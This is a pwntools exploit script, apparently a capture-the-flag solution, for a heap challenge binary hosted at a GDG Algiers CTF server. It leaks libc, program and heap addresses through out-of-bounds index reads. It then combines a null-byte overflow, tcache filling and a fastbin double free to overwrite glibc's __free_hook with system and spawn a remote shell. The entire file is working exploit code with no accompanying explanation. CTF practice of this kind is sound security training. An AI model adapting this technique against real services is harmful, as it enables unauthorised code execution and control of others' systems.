
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'


# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./chall')
libc = ELF('./libc.so.6')
#rop = ROP(exe)

host, port = "pwn.chal.ctf.gdgalgiers.com", "1405"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

def a(size,data):
  sla('option: ', '1')
  sla('Size: ', str(size))
  sa('content: ', data)

def show(idx):
  sla('option: ', '4')
  sla('Index: ', str(idx))

def d(idx):
  sla('option: ', '2')
  sla('index: ', str(idx))


# leak libc stdout address
show(-6)
p.recvuntil('0x', drop=True)
libc.address =  int(p.recv(12),16) - libc.sym['_IO_2_1_stdout_']
print('libc base = '+hex(libc.address))

# leak .bss address
show(-9)
p.recvuntil('0x', drop=True)
exe.address =  int(p.recv(12),16) - 0x4008
print('prog base = '+hex(exe.address))


a(0x28,'A')     # 0
show(0)
p.recvuntil('0x', drop=True)
heap =  int(p.recv(12),16) - 0x260
print('heap base = '+hex(heap))

# use null bye overflow to make 0x118 chunk goes in 0x20 tcache when freed
a(0x118,'B')     # 1
a(0x18,'C')     #2  # will keep this one for double free in fastbin
d(0)
d(3)
d(3)
a(0x28,'A'*0x28)
d(1)

# do it again 6 times to fill 0x20 tcache line
for i in range(6):
  a(0x28,'A')     # 0
  a(0x118,'B')     # 1
  d(0)
  d(3)
  a(0x28,'A'*0x28)
  d(1)

# do again a free on the 0x118 chunk to make it goes in fastbin (need to edit metada to pass)
a(0x28,'A')
a(0x118,p64(0xdeadbeef)+p64(heap+0x10)+p64(0)+p64(0x20))
d(0)
d(3)
a(0x28,'A'*0x28)

# do the double free in fastbin
d(2)
a(0x28,'/bin/sh\x00')	# 0
d(1)
a(0x28,'/bin/sh\x00')   # 0
d(2)

# now empty the 0x20 tcache line
for i in range(7):
  a(0x18,'/bin/sh\x00')
  d(3)

# overwrite __free_hook with system
a(0x18,p64(libc.sym['__free_hook']))
d(3)
a(0x18,'/bin/sh\x00')
a(0x18,p64(libc.sym['system']))
a(0x18,p64(libc.sym['system']))
# enjoy shell
d(0)

p.interactive()


